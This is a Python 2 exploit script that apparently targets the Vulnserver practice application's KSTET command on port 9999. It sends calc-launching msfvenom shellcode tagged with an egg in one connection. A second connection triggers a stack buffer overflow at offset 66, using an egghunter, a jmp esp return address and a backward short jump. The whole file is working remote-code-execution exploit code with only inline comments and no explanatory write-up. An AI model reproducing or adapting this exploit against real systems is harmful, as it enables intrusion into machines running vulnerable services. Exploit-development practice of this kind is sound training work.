#!/usr/bin/python

import socket
import struct

target_ip = "X.X.X.X"
target_port = 9999

def main():
    
    # msfvenom -p windows/exec CMD="calc" -f python -b "\x00"
    buf =  ""
    buf += "\xbd\x40\x52\xae\xc6\xdb\xd0\xd9\x74\x24\xf4\x5e\x29"
    buf += "\xc9\xb1\x30\x31\x6e\x13\x03\x6e\x13\x83\xee\xbc\xb0"
    buf += "\x5b\x3a\xd4\xb7\xa4\xc3\x24\xd8\x2d\x26\x15\xd8\x4a"
    buf += "\x22\x05\xe8\x19\x66\xa9\x83\x4c\x93\x3a\xe1\x58\x94"
    buf += "\x8b\x4c\xbf\x9b\x0c\xfc\x83\xba\x8e\xff\xd7\x1c\xaf"
    buf += "\xcf\x25\x5c\xe8\x32\xc7\x0c\xa1\x39\x7a\xa1\xc6\x74"
    buf += "\x47\x4a\x94\x99\xcf\xaf\x6c\x9b\xfe\x61\xe7\xc2\x20"
    buf += "\x83\x24\x7f\x69\x9b\x29\xba\x23\x10\x99\x30\xb2\xf0"
    buf += "\xd0\xb9\x19\x3d\xdd\x4b\x63\x79\xd9\xb3\x16\x73\x1a"
    buf += "\x49\x21\x40\x61\x95\xa4\x53\xc1\x5e\x1e\xb8\xf0\xb3"
    buf += "\xf9\x4b\xfe\x78\x8d\x14\xe2\x7f\x42\x2f\x1e\x0b\x65"
    buf += "\xe0\x97\x4f\x42\x24\xfc\x14\xeb\x7d\x58\xfa\x14\x9d"
    buf += "\x03\xa3\xb0\xd5\xa9\xb0\xc8\xb7\xa7\x47\x5e\xc2\x85"
    buf += "\x48\x60\xcd\xb9\x20\x51\x46\x56\x36\x6e\x8d\x13\xc8"
    buf += "\x24\x8c\x35\x41\xe1\x44\x04\x0c\x12\xb3\x4a\x29\x91"
    buf += "\x36\x32\xce\x89\x32\x37\x8a\x0d\xae\x45\x83\xfb\xd0"
    buf += "\xfa\xa4\x29\xb3\x9d\x36\xb1\x34"

    # pass a string to the program to put the shellcode in memory
    # format is "COMMAND egg shellcode"
    # "COMMAND" can be any string, can be another valid command but risk 
    # truncating shellcode
    shellcode_string = "RANDOM_STRING " + "w00tw00t"  + buf
    # EIP offset is 66
    # !mona egg 
    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    # Put the egghunter in the buffer, keeping buffer at 66 chars
    offset = ("\x90"*12) + egghunter + ("A" * (66 - 12 - len(egghunter)))

    # jmp esp at 0x625011af
    eip = struct.pack("<I",0x625011AF)

    # Prepend for crash found using boofuzz
    prepend = "KSTET /.:/"

    # Attack string triggers overflow, jumps to ESP, then jumps back 60 bytes
    # to the egghunter
    attack_string = prepend + offset + eip + "\xeb\xc4\x90\x90" + ("B" * 200)

    # This is gross but the exploit would only trigger if I completely closed 
    # out the first session and then send the overflow in a separate session
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(shellcode_string)
    response = s.recv(2048)
    print response
    s.close()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(attack_string)
    s.close()

if __name__ == '__main__':
    main()
